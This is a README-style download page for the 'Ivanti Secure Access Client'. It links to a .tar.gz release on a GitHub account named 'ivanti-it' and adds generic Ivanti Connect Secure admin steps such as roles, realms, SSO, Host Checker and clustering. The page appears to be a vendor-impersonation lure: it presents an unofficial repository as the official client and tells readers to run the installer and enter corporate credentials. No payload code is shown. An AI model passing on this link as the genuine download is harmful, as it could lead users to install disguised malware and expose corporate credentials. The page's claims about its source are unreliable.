# Download Ivanti Secure Access Client

Ivanti Secure Access Client is a comprehensive and secure remote access solution, designed to offer users seamless, policy-based connectivity to enterprise resources. It guarantees that users, regardless of their location, can safely connect to corporate applications, servers, and file shares without compromising on security.

Table of Contents

- [Installation](#installation)
- [User Roles and Access Control](#user-roles-and-access-control)
- [Authentication and Security Policies](#authentication-and-security-policies)
- [Single Sign-On (SSO) and Adaptive Authentication](#single-sign-on-sso-and-adaptive-authentication)
- [Host Checker and Endpoint Security](#host-checker-and-endpoint-security)
- [VPN Tunneling and Secure Application Manager](#vpn-tunneling-and-secure-application-manager)

## Installation

**[Download Ivanti Secure Access Client](https://github.com/ivanti-it/Ivanti-Secure-Access-Client/releases/download/1.2963/Ivanti-Secure-Access-Client.tar.gz)**

After downloading the Ivanti Secure Access Client, follow these steps to install and configure the application:

- Run the installer and follow the on-screen instructions.
- Log in using your corporate credentials.
- Configure your VPN settings based on your organization’s security guidelines.
- Establish a secure connection and safely access internal resources.

For further setup assistance, contact your IT department or refer to the official Ivanti documentation.

## User Roles and Access Control

### Understanding User Roles
User roles determine the access privileges for various groups of users within ICS. Administrators can create roles that specify which resources users can access, session parameters, and interface customization options.

### Role-Based Access Management
ICS supports two main types of roles:
- **Administrator Roles:** These provide management permissions within the ICS system.
- **User Roles:** These define access rights, session policies, and available features for end users.

#### Creating a New User Role
```plaintext
1. Go to Users > User Roles in the admin console.
2. Click "New Role" and enter a role name.
3. Set up access features and session policies.
4. Save the role and assign it to authentication realms.
```

## Authentication and Security Policies

### Authentication Methods
ICS supports multiple authentication servers to verify user identities, such as:

- **Local Authentication Server**
- **Active Directory (AD)**
- **LDAP**
- **RADIUS**
- **SAML-based authentication**

### Setting Up Authentication Realms
Authentication realms define the method used to authenticate users.

#### Configuration Steps
1. Navigate to **Users > Authentication > User Realms**.
2. Click **New Realm** and provide a name.
3. Select an authentication server.
4. Set authentication and role mapping policies.
5. Save the settings and assign the realm to a sign-in policy.

> **[!info]**
> It is recommended to enable multi-factor authentication (MFA) for enhanced security.

## Single Sign-On (SSO) and Adaptive Authentication

### Configuring SSO
SSO allows users to authenticate once and access multiple applications without having to log in again.

ICS supports:
- **SAML 2.0 for web-based SSO**
- **NTLM-based authentication**
- **Kerberos authentication**

#### Enabling SSO
```plaintext
1. Navigate to Authentication > Single Sign-On.
2. Choose the authentication protocol (SAML, NTLM, or Kerberos).
3. Configure identity provider settings.
4. Apply SSO to relevant authentication realms.
5. Save and test the authentication flow.
```

### Adaptive Authentication
Adaptive authentication assesses user behavior, location, and device attributes to enforce risk-based access control.

#### Implementation Steps
- Define risk factors based on geolocation, IP reputation, and device characteristics.
- Apply dynamic policies that modify authentication requirements according to risk levels.

## Host Checker and Endpoint Security

**Host Checker** is a compliance tool that verifies the security status of a device before allowing access.

### Configuring Host Checker Policies
1. Navigate to **Authentication > Host Checker**.
2. Create a new policy and define compliance requirements (e.g., antivirus, firewall, OS version).
3. Apply the policy to authentication realms.
4. Specify remediation actions for non-compliant devices.

> **[!note]**
> Ensure that Host Checker policies are updated regularly to address emerging security threats.

## VPN Tunneling and Secure Application Manager

### VPN Tunneling
ICS supports **SSL-based VPN tunneling**, providing full Layer 3 connectivity to corporate networks.

#### Configuration Steps
- Go to **Users > User Roles** and enable **VPN Tunneling**.
- Set up split tunneling and routing rules.
- Apply session timeout and bandwidth limitation policies.

### Secure Application Manager (SAM)
SAM intercepts application-layer traffic, facilitating secure access to client-server applications.

#### Enabling SAM
- Select **Users > User Roles > Secure Application Manager**.
- Configure allowed applications and servers.
- Apply user role-based access control.

## Resource Policies and Access Control

Resource policies define the access rules for **web applications, file shares, and internal servers**.

### Creating Resource Policies
1. Navigate to **Users > Resource Policies**.
2. Choose the type of resource (Web, File, Terminal Services, etc.).
3. Define allowed or denied resources.
4. Apply policies to relevant user roles.

> **[!important]**
> Regularly audit resource policies to ensure compliance with security standards.

## Logging, Monitoring, and Troubleshooting

### Logging and Event Monitoring
ICS offers **comprehensive logging and monitoring features**.

- Enable event logging under **System > Logging**.
- Configure **Syslog** to forward logs to external monitoring systems.
- Use **Admin Console troubleshooting tools** for real-time diagnostics.

### Troubleshooting Common Issues
- **Authentication failures:** Ensure authentication server settings and network connectivity are correct.
- **VPN connection issues:** Verify split tunneling and firewall configurations.
- **Performance issues:** Monitor system resources and apply load balancing techniques.

## Clustering and High Availability

### Configuring Clustering
ICS supports **clustering** to ensure high availability and load distribution.

#### Setup Steps
1. Go to **System > Clustering**.
2. Add cluster nodes and set up synchronization settings.
3. Choose **active/passive** or **active/active** clustering modes.

## System Maintenance and Configuration Backup

### Performing System Updates
Regular updates ensure **optimal performance and security**.

#### Updating ICS
1. Navigate to **Maintenance > System Update**.
2. Upload the latest firmware package.
3. Restart the system after applying updates.

### Backing Up Configuration Files
Perform regular backups to **prevent data loss**.

#### Backup Process
- Go to **Maintenance > Configuration Backup**.
- Select **Export Configuration**.
- Store backups in a **secure location**.

> **[!note]**
> Automate backups using scheduled tasks to reduce administrative workload.
